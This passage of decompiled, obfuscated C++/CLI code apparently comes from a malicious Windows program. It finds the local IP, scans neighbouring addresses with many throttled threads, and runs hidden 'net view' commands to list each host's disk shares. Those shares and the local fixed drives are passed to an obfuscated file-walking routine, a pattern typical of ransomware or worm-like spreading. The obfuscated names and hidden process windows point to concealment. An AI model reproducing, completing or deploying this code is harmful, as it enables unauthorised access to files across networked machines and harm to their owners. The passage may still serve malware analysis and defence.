        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
    return false;
label_108:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Tidy((deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) &stdAllocatorWcharT4);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Deque_val\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              \u003CModule\u003E.delete((void*) ^(int&) ref stdAllocatorWcharT4);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT3);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
    return true;
  }

  internal static unsafe void std\u002Estack\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Adeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] stack\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Adeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u0020\u003E* obj0)
  {
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Tidy((deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) obj0);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Deque_val\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.delete((void*) *(int*) obj0);
  }

  internal static unsafe sbyte* xytREyYpBfTDh(string s) => (sbyte*) Marshal.StringToHGlobalAnsi(s).ToPointer();

  internal static unsafe void RfISlKTR(sbyte* host, int limitSubDirs)
  {
    string str1 = (string) null;
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    int num2 = -1;
    vector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E stdAllocatorChar1;
    \u003CModule\u003E.std\u002Evector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1);
    // ISSUE: fault handler
    try
    {
      Process process = new Process();
      process.StartInfo.FileName = "net";
      process.StartInfo.Arguments = "view \\\\" + new string(host) + "";
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.CreateNoWindow = true;
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.RedirectStandardError = true;
      process.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
      process.Start();
      string str2;
      do
      {
        ++num2;
        str2 = process.StandardOutput.ReadLine();
        str1 += "\n\n" + str2;
        if (num2 > 0)
          ;
      }
      while (str2 != null);
      Regex regex1 = new Regex(".*(?=[ ]{1,}disco|disk(?:[\\r\\n ]|$))", RegexOptions.IgnoreCase | RegexOptions.Multiline);
      Regex regex2 = new Regex("[ ]+$", RegexOptions.IgnoreCase | RegexOptions.Multiline);
      string input = str1;
      foreach (Match match in regex1.Matches(input))
      {
        string s = match.Groups[0].Value;
        if (!(s == ""))
        {
          sbyte* numPtr = \u003CModule\u003E.xytREyYpBfTDh(s);
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar2, numPtr);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.\u003FA0xAPusFTJv\u002Etrim(&stdAllocatorChar2);
            basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar3, 3, 1);
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar3 + 8), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_02HDBGODGB\u0040\u003F2\u003F2\u003F\u0024AA\u0040), host), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040), &stdAllocatorChar2), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040);
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, &stdAllocatorChar4);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.ADUixeTjiMK(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr), limitSubDirs, 0);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar4);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar4);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
            }
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar3);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
        }
      }
    }
    catch (Exception ex)
    {
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      exception* exceptionPtr;
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num3 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num3 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num3 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_31;
        if (num3 != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num3);
      }
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
    }
label_31:
    // ISSUE: fault handler
    try
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(int&) ((IntPtr) &stdAllocatorChar1 + 12) != 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.delete((void*) ^(int&) ((IntPtr) &stdAllocatorChar1 + 12));
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorChar1 + 12) = 0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorChar1 + 16) = 0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorChar1 + 20) = 0;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    \u003CModule\u003E.delete((void*) ^(int&) ref stdAllocatorChar1);
  }

  internal static unsafe void ojnaPTKtOgHslu(List<object> gfy)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    try
    {
      \u003CModule\u003E.srand((uint) (int) \u003CModule\u003E.\u003FA0xQwpMpcjz\u002Etime((long*) 0));
      \u0024ArrayType\u0024\u0024\u0024BY03H arrayTypeBy03H;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref arrayTypeBy03H = (int) gfy[1];
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &arrayTypeBy03H + 4) = (int) gfy[2];
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &arrayTypeBy03H + 8) = (int) gfy[3];
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &arrayTypeBy03H + 12) = (int) gfy[4];
      \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040D arrayTypeBy0BeD;
      \u003CModule\u003E.aodzAlwiFpdp((sbyte*) &arrayTypeBy0BeD, (int*) &arrayTypeBy03H);
      int limitSubDirs = (int) gfy[0];
      \u003CModule\u003E.RfISlKTR((sbyte*) &arrayTypeBy0BeD, limitSubDirs);
    }
    catch (Exception ex)
    {
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      exception* exceptionPtr;
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num2 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num2 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_11;
        if (num2 != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
      }
    }
label_11:
    --\u003CModule\u003E.countThreadFile;
  }

  internal static unsafe void qvQKrmQKRM(int* ip, int limitSubDirs, int limit)
  {
    \u0024ArrayType\u0024\u0024\u0024BY03H arrayTypeBy03H;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref arrayTypeBy03H = *ip;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy03H + 4) = ip[1];
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy03H + 8) = ip[2];
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy03H + 12) = ip[3];
    if (0 >= limit)
      return;
    int* numPtr = ip + 4;
    int num1 = limit;
    do
    {
      int num2 = *ip;
      if (num2 < (int) byte.MaxValue)
      {
        ip[3] = ip[3] + 1;
        if (ip[3] > (int) byte.MaxValue)
        {
          ip[3] = 0;
          ip[2] = ip[2] + 1;
        }
        if (ip[2] > (int) byte.MaxValue)
        {
          ip[2] = 0;
          ip[1] = ip[1] + 1;
        }
        if (ip[1] > (int) byte.MaxValue)
        {
          ip[1] = 0;
          *ip = num2 + 1;
        }
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(int&) ref arrayTypeBy03H > 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy03H + 12) = ^(int&) ((IntPtr) &arrayTypeBy03H + 12) - 1;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &arrayTypeBy03H + 12) < 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy03H + 12) = (int) byte.MaxValue;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy03H + 8) = ^(int&) ((IntPtr) &arrayTypeBy03H + 8) - 1;
        }
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &arrayTypeBy03H + 8) < 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy03H + 8) = (int) byte.MaxValue;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy03H + 4) = ^(int&) ((IntPtr) &arrayTypeBy03H + 4) - 1;
        }
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &arrayTypeBy03H + 4) < 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &arrayTypeBy03H + 4) = (int) byte.MaxValue;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref arrayTypeBy03H = ^(int&) ref arrayTypeBy03H - 1;
        }
      }
      if (\u003CModule\u003E.countThreadFile >= 20)
      {
        do
        {
          \u003CModule\u003E.Sleep(500U);
        }
        while (\u003CModule\u003E.countThreadFile >= 20);
      }
      \u003CModule\u003E.countThreadFile += 2;
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      JARVIS.Thread.create((__FnPtr<void (List<object>)>) __methodptr(ojnaPTKtOgHslu), true).addArgument((object) limitSubDirs).addArgument((object) *ip).addArgument((object) ip[1]).addArgument((object) ip[2]).addArgument((object) ip[3]).addArgument((object) *numPtr).start();
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      JARVIS.Thread.create((__FnPtr<void (List<object>)>) __methodptr(ojnaPTKtOgHslu), true).addArgument((object) limitSubDirs).addArgument((object) ^(int&) ref arrayTypeBy03H).addArgument((object) ^(int&) ((IntPtr) &arrayTypeBy03H + 4)).addArgument((object) ^(int&) ((IntPtr) &arrayTypeBy03H + 8)).addArgument((object) ^(int&) ((IntPtr) &arrayTypeBy03H + 12)).addArgument((object) ^(int&) ((IntPtr) &arrayTypeBy03H + 16)).start();
      --num1;
    }
    while (num1 != 0);
  }

  internal static unsafe void idyCrSGwdxc(sbyte* letter)
  {
    char* chPtr = (char*) \u003CModule\u003E.new\u005B\u005D(8192U);
    \u003CModule\u003E.MultiByteToWideChar(0U, 0U, letter, -1, chPtr, 4096);
    switch (\u003CModule\u003E.GetDriveTypeW(chPtr))
    {
      case 0:
        break;
      case 1:
        break;
      case 5:
        break;
      case 6:
        break;
      default:
        \u003CModule\u003E.ADUixeTjiMK(letter, 5, 0);
        break;
    }
  }

  internal static unsafe sbyte* jySiVFhQbN()
  {
    WSAData wsaData;
    \u0024ArrayType\u0024\u0024\u0024BY0BAAA\u0040D arrayTypeBy0BaaaD;
    sbyte* numPtr;
    if (\u003CModule\u003E.WSAStartup((ushort) 257, &wsaData) == 0 && \u003CModule\u003E.gethostname((sbyte*) &arrayTypeBy0BaaaD, 4096) == 0)
    {
      hostent* hostentPtr = \u003CModule\u003E.gethostbyname((sbyte*) &arrayTypeBy0BaaaD);
      if ((IntPtr) hostentPtr != IntPtr.Zero)
      {
        int num1 = 0;
        int num2 = *(int*) ((IntPtr) hostentPtr + 12);
        if (*(int*) num2 != 0)
        {
          int num3 = num2;
          do
          {
            numPtr = \u003CModule\u003E.inet_ntoa(*(in_addr*) *(int*) num3);
            ++num1;
            num3 = num1 * 4 + *(int*) ((IntPtr) hostentPtr + 12);
          }
          while (*(int*) num3 != 0);
        }
      }
    }
    return numPtr;
  }

  internal static unsafe void ipStringToArray(sbyte* ip, int* res)
  {
    int num = 0;
    basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
